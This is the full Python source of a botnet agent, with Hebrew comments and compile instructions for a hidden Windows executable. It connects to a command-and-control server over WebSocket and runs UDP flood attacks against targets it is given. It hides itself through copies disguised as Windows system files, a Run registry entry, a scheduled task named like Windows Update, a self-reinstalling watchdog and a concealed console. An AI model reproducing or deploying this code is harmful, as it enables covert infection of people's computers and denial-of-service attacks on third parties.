# ============================================================
#  AGENT — מתחבר ל-C2 ב-WebSocket, מקבל משימות
#  קומפילציה: pyinstaller --onefile --noconsole --name "SystemHelper" agent.py
# ============================================================

import os
import sys
import time
import socket
import threading
import random
import string
import json
import uuid
import shutil
import subprocess
import asyncio
from pathlib import Path
import websockets

# ============================================================
#  CONFIG — שנה לפני קומפילציה!
# ============================================================

C2_HOST = "YOUR-C2-URL-HERE"      # ← דוגמה: "mybot.back4app.io"
C2_USE_TLS = True                  # ← True = wss:// (Back4app/Koyeb). False = ws:// (מקומי)
C2_PORT = None                     # ← None = ברירת מחדל (443 ל-wss, 8000 ל-ws)

if C2_USE_TLS:
    C2_WS_URL = f"wss://{C2_HOST}/ws"
else:
    p = C2_PORT or 8000
    C2_WS_URL = f"ws://{C2_HOST}:{p}/ws"

DEFAULT_THREADS = 20
DEFAULT_FORCE = 1024
DEFAULT_DURATION = 30
RECONNECT_DELAY = 5
PERSISTENCE = True


def get_app_dir() -> Path:
    if sys.platform == "win32":
        base = Path(os.getenv("APPDATA", Path.home()))
    elif sys.platform == "darwin":
        base = Path.home() / "Library" / "Application Support"
    else:
        base = Path.home() / ".config"
    d = base / ".volunteer_node"
    d.mkdir(parents=True, exist_ok=True)
    return d


def get_persist_paths() -> list:
    if sys.platform != "win32":
        home = Path.home()
        return [
            home / ".cache" / ".system-node" / "wupdate",
            home / ".local" / "share" / ".vnode" / "svchost",
        ]
    appdata = Path(os.getenv("APPDATA", Path.home()))
    localappdata = Path(os.getenv("LOCALAPPDATA", Path.home()))
    return [
        appdata / "Microsoft" / "Windows" / "Caches" / "wupdate.exe",
        localappdata / "Microsoft" / "Windows" / "INetCache" / "svchost32.exe",
    ]


APP_DIR = get_app_dir()
ID_FILE = APP_DIR / "agent_id.txt"
PERSIST_PATHS = get_persist_paths()
REG_NAME = "WindowsUpdateService"
TASK_NAME = "WindowsUpdateTask"


def get_current_exe() -> Path:
    if getattr(sys, "frozen", False):
        return Path(sys.executable).resolve()
    return Path(__file__).resolve()


def install_copy(src: Path, dst: Path) -> bool:
    try:
        dst.parent.mkdir(parents=True, exist_ok=True)
        if dst.exists():
            try:
                if dst.stat().st_size == src.stat().st_size:
                    return True
            except Exception:
                pass
        shutil.copy2(src, dst)
        if sys.platform == "win32":
            try:
                subprocess.run(["attrib", "+h", "+s", str(dst)],
                               capture_output=True, creationflags=0x08000000)
            except Exception:
                pass
        return True
    except Exception:
        return False


def install_all_copies():
    src = get_current_exe()
    for path in PERSIST_PATHS:
        if not path.exists() or path != src:
            install_copy(src, path)


def install_registry():
    if sys.platform != "win32":
        return
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, str(PERSIST_PATHS[0]))
        winreg.CloseKey(key)
    except Exception:
        pass


def install_scheduled_task():
    if sys.platform != "win32":
        return
    try:
        subprocess.run(["schtasks", "/create", "/tn", TASK_NAME,
                        "/tr", str(PERSIST_PATHS[0]),
                        "/sc", "onlogon", "/f"],
                       capture_output=True, creationflags=0x08000000)
    except Exception:
        pass


def watchdog_loop():
    while True:
        time.sleep(30)
        try:
            current = get_current_exe()
            for path in PERSIST_PATHS:
                if not path.exists():
                    install_copy(current, path)
            install_registry()
        except Exception:
            pass


def remove_registry():
    if sys.platform != "win32":
        return
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, REG_NAME)
        winreg.CloseKey(key)
    except Exception:
        pass


def remove_scheduled_task():
    if sys.platform != "win32":
        return
    try:
        subprocess.run(["schtasks", "/delete", "/tn", TASK_NAME, "/f"],
                       capture_output=True, creationflags=0x08000000)
    except Exception:
        pass


def get_agent_id() -> str:
    if ID_FILE.exists():
        try:
            return ID_FILE.read_text().strip()
        except Exception:
            pass
    seed = f"{socket.gethostname()}-{uuid.getnode()}-{random.randint(0, 10**9)}"
    aid = uuid.uuid5(uuid.NAMESPACE_DNS, seed).hex[:16]
    try:
        ID_FILE.write_text(aid)
    except Exception:
        pass
    return aid


class FloodWorker:
    def __init__(self, target, port, force, threads):
        self.target = target
        self.port = port or 0
        self.force = force
        self.threads = threads
        payload = self._make_payload(force)
        self.payload = payload
        self.payload_len = len(payload)
        self._lock = threading.Lock()
        self.sent_bytes = 0
        self.sent_packets = 0
        self.start_time = 0.0
        self.stop_event = threading.Event()

    @staticmethod
    def _make_payload(size: int) -> bytes:
        if random.random() < 0.5:
            return b"x" * size
        alphabet = (string.ascii_letters + string.digits).encode()
        return bytes(random.choices(alphabet, k=size))

    def _worker(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
        except Exception:
            pass
        while not self.stop_event.is_set():
            try:
                dst_port = self.port if self.port else random.randint(1, 65535)
                sock.sendto(self.payload, (self.target, dst_port))
                with self._lock:
                    self.sent_bytes += self.payload_len
                    self.sent_packets += 1
            except OSError:
                pass
            except Exception:
                pass
        try:
            sock.close()
        except Exception:
            pass

    def run(self, duration: int):
        self.start_time = time.time()
        workers = [threading.Thread(target=self._worker, daemon=True)
                   for _ in range(self.threads)]
        for w in workers:
            w.start()
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            pass
        self.stop_event.set()
        for w in workers:
            w.join(timeout=2)

    def stats(self) -> dict:
        with self._lock:
            elapsed = time.time() - self.start_time if self.start_time else 0
            return {
                "sent_bytes": self.sent_bytes,
                "sent_packets": self.sent_packets,
                "elapsed": elapsed,
                "mbps": round((self.sent_bytes * 8) / 1e6 / max(elapsed, 1), 2),
            }


async def execute_task(ws, task: dict):
    tid = task["task_id"]
    target = task["target"]
    port = task.get("port", 0)
    duration = task.get("duration", DEFAULT_DURATION)
    threads = task.get("threads", DEFAULT_THREADS)
    force = task.get("force", DEFAULT_FORCE)

    print(f"[Node] ▶️  {target}:{port or 'rand'} ({duration}s x{threads})", flush=True)

    flooder = FloodWorker(target, port, force, threads)

    async def heartbeat():
        try:
            while True:
                await asyncio.sleep(3)
                s = flooder.stats()
                await ws.send(json.dumps({
                    "type": "heartbeat",
                    "task_id": tid,
                    "sent_bytes": s["sent_bytes"],
                    "sent_packets": s["sent_packets"],
                    "elapsed": s["elapsed"],
                }))
        except Exception:
            pass

    hb = asyncio.create_task(heartbeat())
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, flooder.run, duration)
    hb.cancel()

    s = flooder.stats()
    print(f"[Node] ✅ {s['sent_packets']:,} pkt | {s['sent_bytes']/1e6:.1f} MB | {s['mbps']} Mbps", flush=True)

    try:
        await ws.send(json.dumps({
            "type": "result",
            "task_id": tid,
            "sent_bytes": s["sent_bytes"],
            "sent_packets": s["sent_packets"],
            "elapsed": s["elapsed"],
        }))
    except Exception:
        pass


async def ws_loop():
    agent_id = get_agent_id()
    hostname = socket.gethostname()
    uri = f"{C2_WS_URL}/{agent_id}"
    print(f"[Node] ID={agent_id[:8]} → {uri}", flush=True)

    capabilities = {
        "os": sys.platform,
        "hostname": hostname,
        "cpus": os.cpu_count() or 1,
    }

    while True:
        try:
            async with websockets.connect(uri, ping_interval=30, ping_timeout=60,
                                          max_size=None) as ws:
                await ws.send(json.dumps({
                    "type": "register",
                    "hostname": hostname,
                    "capabilities": capabilities,
                }))
                print("[Node] ✅ מחובר", flush=True)

                async for raw in ws:
                    try:
                        msg = json.loads(raw)
                    except Exception:
                        continue
                    if msg.get("type") == "task":
                        asyncio.create_task(execute_task(ws, msg))

        except websockets.exceptions.ConnectionClosed:
            print(f"[Node] ניתוק. retry ב-{RECONNECT_DELAY}s...", flush=True)
        except Exception as e:
            print(f"[Node] שגיאה: {e}. retry ב-{RECONNECT_DELAY}s...", flush=True)

        await asyncio.sleep(RECONNECT_DELAY)


def do_uninstall():
    print("[Uninstall]...")
    remove_registry()
    remove_scheduled_task()
    for path in PERSIST_PATHS:
        try:
            if path.exists():
                if sys.platform == "win32":
                    subprocess.run(["attrib", "-h", "-s", str(path)],
                                   capture_output=True, creationflags=0x08000000)
                path.unlink()
        except Exception:
            pass
    try:
        if ID_FILE.exists():
            ID_FILE.unlink()
        if APP_DIR.exists():
            shutil.rmtree(APP_DIR, ignore_errors=True)
    except Exception:
        pass
    print("[Uninstall] ✅")


def main():
    if "--uninstall" in sys.argv:
        do_uninstall()
        return

    if PERSISTENCE:
        install_all_copies()
        install_registry()
        install_scheduled_task()
        threading.Thread(target=watchdog_loop, daemon=True).start()

    if sys.platform == "win32":
        try:
            import ctypes
            whnd = ctypes.windll.kernel32.GetConsoleWindow()
            if whnd != 0:
                ctypes.windll.user32.ShowWindow(whnd, 0)
        except Exception:
            pass

    try:
        asyncio.run(ws_loop())
    except KeyboardInterrupt:
        print("\n[Node] כיבוי.", flush=True)


if __name__ == "__main__":
    main()